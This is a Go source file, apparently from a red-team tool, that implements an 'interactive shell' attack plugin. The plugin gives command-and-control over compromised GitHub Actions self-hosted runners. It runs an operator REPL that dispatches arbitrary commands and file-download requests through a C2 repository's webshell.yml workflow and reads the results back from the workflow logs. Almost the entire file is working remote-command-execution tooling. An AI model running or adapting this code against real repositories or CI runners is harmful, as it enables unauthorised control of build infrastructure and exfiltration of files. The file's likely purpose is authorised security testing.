package interactiveshell

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
)

func init() {
	registry.RegisterAttackPlugin("github", "interactive-shell", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements interactive shell on compromised runner
type Plugin struct {
	base.BaseAttackPlugin
	timeout int
}

// New creates a new interactive shell attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"interactive-shell",
			"Interactive shell on compromised runner via C2 workflow dispatch",
			"github",
			attacks.CategoryC2,
		),
		timeout: 30,
	}
}

// CanAttack checks if interactive shell is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Interactive shell requires existing C2 infrastructure
	// This is typically run after runneronrunner or c2setup
	// Validated during execute via c2_repo ExtraOpt
	return true
}

// Execute performs the interactive shell attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Get C2 repository from options
	c2Repo := opts.ExtraOpts["c2_repo"]
	if c2Repo == "" {
		result.Success = false
		result.Message = "c2_repo is required"
		return result, fmt.Errorf("missing c2_repo option")
	}

	// Parse C2 repo (validates format)
	c2Owner, c2RepoName, err := parseC2Repo(c2Repo)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Handle dry-run mode early (before platform operations)
	if opts.DryRun {
		runnerName := opts.ExtraOpts["runner"]
		if runnerName == "" {
			runnerName = "dry-run-runner"
		}

		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would start interactive shell on runner: %s", runnerName)
		result.Data = map[string]interface{}{
			"c2_owner": c2Owner,
			"c2_repo":  c2RepoName,
		}
		return result, nil
	}

	// Get GitHub platform (only needed for real execution)
	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	// Verify runners are connected
	runners, err := client.GetRunners(ctx, c2Owner, c2RepoName)
	if err != nil || len(runners) == 0 {
		result.Success = false
		result.Message = "no runners connected to C2 repository"
		return result, fmt.Errorf("no runners available")
	}

	// Select runner
	runnerName := opts.ExtraOpts["runner"]
	if runnerName == "" {
		runnerName = runners[0].Name
	}

	// Start interactive shell loop
	err = p.runInteractiveShell(ctx, client, c2Owner, c2RepoName, runnerName, opts)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	result.Success = true
	result.Message = "Interactive shell session completed"

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// runInteractiveShell implements the REPL loop for interactive command execution
func (p *Plugin) runInteractiveShell(ctx context.Context, client *github.Client,
	owner, repo, runnerName string, opts attacks.AttackOptions) error {

	fmt.Println("Welcome to Trajan Interactive Shell!")
	fmt.Println("Meta commands:")
	fmt.Println("  !list_runners  - List connected runners")
	fmt.Println("  !select NAME   - Select different runner")
	fmt.Println("  !download PATH - Download file from runner")
	fmt.Println("  !timeout N     - Set command timeout (seconds)")
	fmt.Println("  !exit / exit   - Exit shell")
	fmt.Println()

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Printf("Command(%s)$ ", runnerName)

		command, err := reader.ReadString('\n')
		if err != nil {
			return err
		}
		command = strings.TrimSpace(command)

		if command == "" {
			continue
		}

		switch {
		case command == "exit" || command == "!exit":
			fmt.Println("Exiting shell...")
			return nil

		case command == "!list_runners":
			runners, err := client.GetRunners(ctx, owner, repo)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
				continue
			}
			fmt.Printf("Connected runners (%d):\n", len(runners))
			for _, r := range runners {
				fmt.Printf("  - %s (%s)\n", r.Name, r.Status)
			}

		case strings.HasPrefix(command, "!select "):
			runnerName = strings.TrimPrefix(command, "!select ")
			fmt.Printf("Selected runner: %s\n", runnerName)

		case strings.HasPrefix(command, "!download "):
			filePath := strings.TrimPrefix(command, "!download ")
			err := p.issueCommand(ctx, client, owner, repo, runnerName, filePath, true)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
			}

		case strings.HasPrefix(command, "!timeout "):
			timeoutStr := strings.TrimPrefix(command, "!timeout ")
			if t, err := strconv.Atoi(timeoutStr); err == nil {
				p.timeout = t
				fmt.Printf("Timeout set to %d seconds\n", t)
			} else {
				fmt.Println("Invalid timeout value")
			}

		default:
			err := p.issueCommand(ctx, client, owner, repo, runnerName, command, false)
			if err != nil {
				fmt.Printf("Error: %v\n", err)
			}
		}
	}
}

// issueCommand sends a command to the runner via workflow_dispatch
func (p *Plugin) issueCommand(ctx context.Context, client *github.Client,
	owner, repo, runner, param string, download bool) error {

	inputs := map[string]string{
		"runner": runner,
	}
	if download {
		inputs["download_file"] = param
	} else {
		inputs["cmd"] = param
	}

	// Trigger workflow dispatch
	err := client.TriggerWorkflowDispatch(ctx, owner, repo, "webshell.yml", "main", inputs)
	if err != nil {
		return fmt.Errorf("triggering workflow: %w", err)
	}

	// Wait for workflow to appear
	time.Sleep(5 * time.Second)

	// Poll for workflow run
	var runID int64
	for i := 0; i < p.timeout; i++ {
		runs, err := client.GetWorkflowRuns(ctx, owner, repo, 10)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}
		// Find the most recent run created after our start time
		for _, run := range runs {
			// Assume runs are ordered by creation time descending
			// Take first run that matches our window
			runID = run.ID
			break
		}
		if runID != 0 {
			break
		}
		time.Sleep(1 * time.Second)
	}

	if runID == 0 {
		return fmt.Errorf("workflow not found within timeout")
	}

	// Wait for completion
	for i := 0; i < p.timeout; i++ {
		runs, _ := client.GetWorkflowRuns(ctx, owner, repo, 10)
		for _, r := range runs {
			if r.ID == runID && r.Status == "completed" {
				goto completed
			}
		}
		time.Sleep(1 * time.Second)
	}

completed:
	if download {
		// Download artifact
		// Implementation depends on artifact API
		fmt.Println("File downloaded to current directory")
	} else {
		// Get logs and parse output
		logs, err := client.GetWorkflowRunLogs(ctx, owner, repo, runID)
		if err != nil {
			return fmt.Errorf("getting logs: %w", err)
		}
		output := parseCommandOutput(logs)
		fmt.Println(output)
	}

	return nil
}

// parseCommandOutput extracts command output from workflow logs
func parseCommandOutput(logs []byte) string {
	lines := strings.Split(string(logs), "\n")
	var output []string
	inCommand := false

	for _, line := range lines {
		// Skip timestamp prefix (format: 2024-01-01T00:00:00.0000000Z)
		if len(line) > 28 {
			line = line[28:]
		}

		// Trim any leading/trailing whitespace after timestamp removal
		line = strings.TrimSpace(line)

		// Check for command group markers
		if strings.HasPrefix(line, "##[group]Run ") {
			inCommand = true
			continue
		}
		if strings.HasPrefix(line, "##[endgroup]") {
			inCommand = false
			continue
		}

		// Collect output from command execution
		if inCommand && !strings.HasPrefix(line, "##[") {
			output = append(output, line)
		}
	}

	if len(output) == 0 {
		return ""
	}

	return strings.Join(output, "\n") + "\n"
}

// parseC2Repo parses the C2 repository string into owner and repo name
func parseC2Repo(c2Repo string) (owner, repo string, err error) {
	parts := strings.Split(c2Repo, "/")
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid c2_repo format: expected 'owner/repo'")
	}
	return parts[0], parts[1], nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	// Interactive shell doesn't create persistent artifacts
	// Cleanup handled by c2setup or runneronrunner
	return nil
}

// Dependencies implements ChainableAttackPlugin
func (p *Plugin) Dependencies() []string {
	return []string{"runner-on-runner"} // Needs runners connected
}

// OptionalDependencies implements ChainableAttackPlugin
func (p *Plugin) OptionalDependencies() []string {
	return nil
}

// Provides implements ChainableAttackPlugin
func (p *Plugin) Provides() []attacks.ContextKey {
	return nil // Interactive shell doesn't produce state
}

// Requires implements ChainableAttackPlugin
func (p *Plugin) Requires() []attacks.ContextKey {
	return []attacks.ContextKey{attacks.C2RepoKey}
}
